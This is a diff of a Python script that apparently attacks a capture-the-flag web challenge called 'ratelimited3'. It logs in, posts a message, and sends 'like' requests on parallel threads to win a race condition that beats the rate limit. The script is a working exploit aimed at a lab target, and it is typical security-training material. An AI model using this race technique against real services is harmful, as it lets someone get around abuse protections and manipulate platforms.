@@ -6,7 +6,9 @@ import string
 #from bs4 import BeautifulSoup
 
 #URL="http://ratelimited.ctf.offdef.it/"
-URL="http://ratelimited2.ctf.offdef.it/"
+#URL="http://ratelimited2.ctf.offdef.it/"
+URL="http://ratelimited3.ctf.offdef.it/"
+
 
 def login(session, username, password):
     target = URL + "login"
@@ -20,7 +22,7 @@ def register(session, username, password):
 
 def like(session, messageID):
     target = URL + "like"
-    r = session.post(target, data={'msg_id': messageID})
+    r = session.post(target, data={'message_id': messageID})
     if 'You got tons of likes:' in r.text:
         print(r.text)
     elif 'You are liking too fast!' in r.text:
@@ -47,8 +49,7 @@ page = login(s, u, p)
 #print(page.text)
 print("Logged in.")
 
-page = post(s, "ciao")
-print("Posted.")
+
 
 
 def extract_n_words_after(text, username_by_, n):
@@ -74,22 +75,24 @@ def getMessageID(text):
         number = match.group(1)
         return number
 
-if (u in page.text):
-    id = getMessageID(extract_n_words_after(page.text, u, 20))
 
-print("MessageID: " + id)
 
 while True:
-    print("New try...")
-    t1 = Thread(target=like, args=(s, id))
-    t2 = Thread(target=like, args=(s, id))
-    t3 = Thread(target=like, args=(s, id))
-    t4 = Thread(target=like, args=(s, id))
+    #print("New try...")
+    page = post(s, "ciao")
+    #print("Posted.")
+    if (u in page.text):
+        id = getMessageID(extract_n_words_after(page.text, u, 20))
+        print("MessageID: " + id)
+        t1 = Thread(target=like, args=(s, id))
+        t2 = Thread(target=like, args=(s, id))
+        t3 = Thread(target=like, args=(s, id))
+        t4 = Thread(target=like, args=(s, id))
 
-    t1.start()
-    t2.start()
-    t3.start()
-    t4.start()
+        t1.start()
+        t2.start()
+        t3.start()
+        t4.start()
 
     time.sleep(0.1)
 
